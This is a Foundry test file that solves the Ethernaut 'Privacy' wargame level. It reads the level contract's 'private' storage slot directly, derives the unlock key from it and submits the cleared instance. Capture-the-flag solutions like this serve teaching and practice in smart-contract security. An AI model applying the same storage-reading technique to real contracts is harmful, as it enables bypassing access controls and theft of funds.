// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "ds-test/test.sol";
import "../src/levels/Privacy/Privacy.sol";
import "../src/levels/Privacy/PrivacyFactory.sol";
import "../src/Ethernaut.sol";
import {Vm} from "forge-std/Vm.sol";

contract PrivacyTest is DSTest {
    Ethernaut ethernaut;
    PrivacyFactory privacyFactory;
    Vm private constant vm = Vm(HEVM_ADDRESS);
    address eoa = address(69);

    function setUp() public {
        ethernaut = new Ethernaut();
        privacyFactory = new PrivacyFactory();
        ethernaut.registerLevel(privacyFactory);

        vm.deal(eoa, 1 ether);
    }

    function testIsPrivacyCleared() public {
        vm.startPrank(eoa);

        address instance = ethernaut.createLevelInstance(privacyFactory);
        bytes32 slot = vm.load(instance, bytes32(uint256(5)));
        bytes16 key = bytes16(slot);
        Privacy(instance).unlock(key);

        assertTrue(ethernaut.submitLevelInstance(payable(instance)));

        vm.stopPrank();
    }
}
